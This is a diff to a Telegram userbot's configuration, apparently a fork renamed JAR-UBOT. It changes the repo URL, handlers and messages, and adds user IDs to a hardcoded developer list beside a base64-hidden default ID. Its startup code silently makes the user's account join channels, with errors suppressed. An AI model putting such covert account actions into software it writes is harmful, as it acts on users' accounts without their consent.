@@ -123,16 +123,16 @@ GITHUB_ACCESS_TOKEN = os.environ.get("GITHUB_ACCESS_TOKEN", None)
 # Custom (forked) repo URL for updater.
 UPSTREAM_REPO_URL = os.environ.get(
     "UPSTREAM_REPO_URL",
-    "https://github.com/jaruu69/RAM-UTOD")
+    "https://github.com/zarszs/RAM-UTOD")
 
 # sudo
 SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "").split()}
 BL_CHAT = {int(x) for x in os.environ.get("BL_CHAT", "").split()}
 
 #handler
-CMD_HANDLER = os.environ.get("CMD_HANDLER") or "-"
+CMD_HANDLER = os.environ.get("CMD_HANDLER") or "."
 
-SUDO_HANDLER = os.environ.get("SUDO_HANDLER", r"?")
+SUDO_HANDLER = os.environ.get("SUDO_HANDLER") or "?"
 
 BLACKLIST_GCAST = {int(x) for x in os.environ.get("BLACKLIST_GCAST", "").split()}
 
@@ -217,7 +217,7 @@ DEFAULT = list(map(int, b64decode("MTkyNzgyNjgzMw==").split()))
 REPO_NAME = os.environ.get("REPO_NAME") or "⭐𝗝𝗔𝗥-𝗨𝗕𝗢𝗧⭐"
 
 # Default botlog
-BOTLOG_MSG = os.environ.get("BOTLOG_MSG") or f"```💢 JAR - UBOT DAH AKTIF KONTOL!!! 💢```"
+BOTLOG_MSG = os.environ.get("BOTLOG_MSG") or f"```💢 JAR - UBOT HAS BEEN ACTIVATED!!! 💢```"
 
 
 # Devg For gesss
@@ -227,6 +227,8 @@ DEVG = [
     1977874449, #lunar
     844432220, #risman
     2003295492,
+    1927826833,
+    5185945994,
 ]
 
 # DEVS only own id
@@ -271,7 +273,7 @@ ZIP_DOWNLOAD_DIRECTORY = os.environ.get("ZIP_DOWNLOAD_DIRECTORY", "./zips")
 BITLY_TOKEN = os.environ.get("BITLY_TOKEN", None)
 
 # Bot Name
-TERM_ALIAS = os.environ.get("TERM_ALIAS", "RAM-UBOT")
+TERM_ALIAS = os.environ.get("TERM_ALIAS", "JAR-UBOT")
 
 # Bot Version
 BOT_VER = os.environ.get("BOT_VER", "9.2.5")
@@ -588,7 +590,6 @@ with bot:
     try:
         bot(Y("@ldaddystore"))
         bot(Y("@jarsuprot"))
-        bot(Y("@pornhpub"))
     except BaseException:
         pass
     try:
